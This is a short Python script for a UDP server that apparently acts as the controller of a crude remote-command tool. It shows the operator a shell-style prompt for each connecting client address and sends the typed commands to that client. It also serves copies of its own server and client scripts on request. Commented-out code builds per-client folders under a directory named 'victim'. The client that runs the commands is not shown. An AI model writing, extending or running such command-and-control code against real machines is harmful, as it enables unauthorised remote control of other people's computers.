from distutils.cmd import Command
from socket import *
import os

SERVER_F = './UDPServer.py'
CLIENT_F = './UDPClient.py'

serverPort = 12000
serverSocket = socket(AF_INET, SOCK_DGRAM)
serverSocket.bind(('', serverPort))
print('The server is ready to receive')
while 1:
    control, clientAddress = serverSocket.recvfrom(1024)
    # dirs = str(control.decode('utf-8')).split(',')
    # try:
    #     for i in dirs:
    #         if not os.path.isdir('victim/' + i):
    #             os.makedirs('victim/' + i)
    # except:
    #     serverSocket.sendto(b'error', clientAddress)
    # finally:
    #     serverSocket.sendto(b'ok', clientAddress)
    print('connection established')
    if control == b'':
        user = os.environ.get('USERNAME')
        serverSocket.sendto(bytes(input(f'{user}@{clientAddress[0]}>'), 'utf-8'), clientAddress)
        continue

    if control.decode('utf-8').startswith('get'):

        if control == b'get server':
            file = SERVER_F
            
        if control == b'get client':
            file = CLIENT_F
        
        with open(file, 'rb') as f:
            response = f.read()
            serverSocket.sendto(response, clientAddress)
            continue